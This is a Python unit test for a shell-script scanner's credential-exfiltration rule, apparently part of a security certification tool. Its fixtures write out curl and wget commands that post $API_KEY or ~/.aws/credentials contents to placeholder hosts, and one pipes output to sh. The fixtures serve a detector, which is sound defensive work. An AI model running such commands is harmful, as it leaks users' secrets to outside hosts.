"""Inert fixed-reader request frames; independent body and compound risks remain."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings

CASES = [
    (
        "direct_auth",
        "curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"candidate"]],
    ),
    (
        "direct_body",
        "curl --data \"$API_KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"confirmed"]],
    ),
    (
        "auth_body",
        "curl -H \"Authorization: Bearer $API_KEY\" --data \"$API_KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"confirmed"]],
    ),
    (
        "literal",
        "KEY=\"$API_KEY\"\ncurl --data '$KEY' https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [],
    ),
    (
        "escaped",
        "KEY=\"$API_KEY\"\ncurl --data \"\\$KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [],
    ),
    (
        "public",
        "API_KEY=public\ncurl -H \"Authorization: Bearer $API_KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [],
    ),
    (
        "known_auth",
        "KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[2,"candidate"]],
    ),
    (
        "mixed",
        "curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'\ncurl --data \"$API_KEY\" https://other.invalid",
        [[1,"candidate"],[2,"confirmed"]],
    ),
    (
        "file_header",
        "KEY=$(cat ~/.aws/credentials)\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[2,"confirmed"]],
    ),
    (
        "wget",
        "wget --post-data=\"$API_KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"confirmed"]],
    ),
    (
        "quoted_pipe",
        "curl -H \"Authorization: Bearer $API_KEY\" --data \"a|b\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"candidate"]],
    ),
    (
        "multiline",
        "curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid | python3 -c 'import json,sys\nprint(json.load(sys.stdin))'",
        [[1,"candidate"]],
    ),
    (
        "open_pipe",
        "curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid |\npython3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"candidate"]],
    ),
    (
        "continued",
        "curl \\\n -H \"Authorization: Bearer $API_KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"candidate"]],
    ),
    (
        "extra_command",
        "KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'; curl --data \"$KEY\" https://other.invalid",
        [[2,"confirmed"]],
    ),
    (
        "program_expansion",
        "KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | python3 -c \"import json,sys; print('$KEY'); print(json.load(sys.stdin))\"",
        [[2,"confirmed"]],
    ),
    (
        "extra_pipe",
        "KEY=\"$API_KEY\"\ncurl -H \"Authorization: Bearer $KEY\" https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))' | sh",
        [[2,"confirmed"]],
    ),
    (
        "body_with_literal_header",
        "curl --data \"$API_KEY\" -H 'Authorization: Bearer $API_KEY' https://example.invalid | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
        [[1,"confirmed"]],
    ),
]


class ShellPipelineRequestTests(unittest.TestCase):
    def test_request_context(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)
